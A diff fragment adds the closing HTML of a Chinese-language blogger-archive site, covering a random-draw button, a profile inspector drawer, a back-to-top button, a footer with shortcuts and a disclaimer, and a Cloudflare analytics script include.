+            <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2"><path d="M21 12a9 9 0 0 0-9-9 9.75 9.75 0 0 0-6.74 2.74L3 8"></path><path d="M3 3v5h5"></path><path d="M3 12a9 9 0 0 0 9 9 9.75 9.75 0 0 0 6.74-2.74L21 16"></path><path d="M16 16h5v5"></path></svg>
+            <span>再抽一次 (按 R)</span>
+          </button>
+        </div>
+
+        <div class="roulette-dismiss-hint" id="roulette-dismiss-hint">按 ESC 或点击任意空白处关闭</div>
+
+      </div>
+    </div>
+
+    <!-- Blogger Inspector Detail Drawer (Manual card inspector) -->
+    <div class="inspector-backdrop hidden" id="inspector-backdrop">
+      <aside class="inspector-drawer" id="inspector-drawer" role="dialog" aria-modal="true" aria-labelledby="drawer-user-name">
+        <div class="drawer-header">
+          <div class="drawer-title-group">
+            <span class="drawer-badge-tag" id="drawer-badge-tag">博主档案</span>
+            <span class="drawer-meta-tip">按 ESC 关闭</span>
+          </div>
+          <button class="drawer-close-btn" id="drawer-close-btn" title="关闭 (ESC)" aria-label="关闭详情">
+            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line></svg>
+          </button>
+        </div>
+        
+        <div class="drawer-body" id="drawer-body-content">
+          <!-- Populated dynamically by JS -->
+        </div>
+      </aside>
+    </div>
+
+    <!-- Floating Toast Notification -->
+    <div class="toast-container" id="toast-container" aria-live="polite"></div>
+
+    <!-- Floating Back to Top Interactive Button (Apple Physics & Glassmorphism) -->
+    <button class="btn-back-to-top" id="btn-back-to-top" aria-label="回到页面顶部" title="回到顶部 (快捷键: Home)">
+      <svg class="back-to-top-arrow" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.3" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+        <line x1="12" y1="19" x2="12" y2="5"></line>
+        <polyline points="5 12 12 5 19 12"></polyline>
+      </svg>
+    </button>
+
+    <!-- Minimal Modern Footer -->
+    <footer class="v2-footer">
+      <div class="footer-inner">
+        <div class="footer-row-top">
+          <div class="footer-left">
+            <span style="font-weight: 700; color: var(--text-main);">女菩萨</span>
+            
+            <span>X-Archive Curation Vault</span>
+          </div>
+          <div class="footer-right">
+            
+            <span class="dot-sep">·</span>
+            <span class="footer-shortcuts">
+              <kbd>/</kbd> 搜索 
+              <kbd>R</kbd> 抽卡 
+              <kbd>1</kbd><kbd>2</kbd><kbd>3</kbd> 视图 
+              <kbd>T</kbd> 主题
+            </span>
+          </div>
+        </div>
+        <div class="footer-disclaimer">
+          免责声明：本站仅为社交网络公开资料的技术性归档与索引系统，不存储、不分发任何第三方多媒体资源。点击链接将直接跳转至创作者官方平台，所有内容版权及言论由原作者与第三方平台自行负责。
+        </div>
+      </div>
+    </footer>
+
+  </div>
+
+  <script src="/static/bloggers-assets/app.js" type="module"></script>
+<!-- Cloudflare Pages Analytics --><script defer="" src="/static/bloggers-assets/beacon.min.js" data-cf-beacon="{&quot;token&quot;: &quot;afacb0bcc101408eb6430f4d7d4c60b6&quot;}"></script><!-- Cloudflare Pages Analytics -->
+
+</body></html>
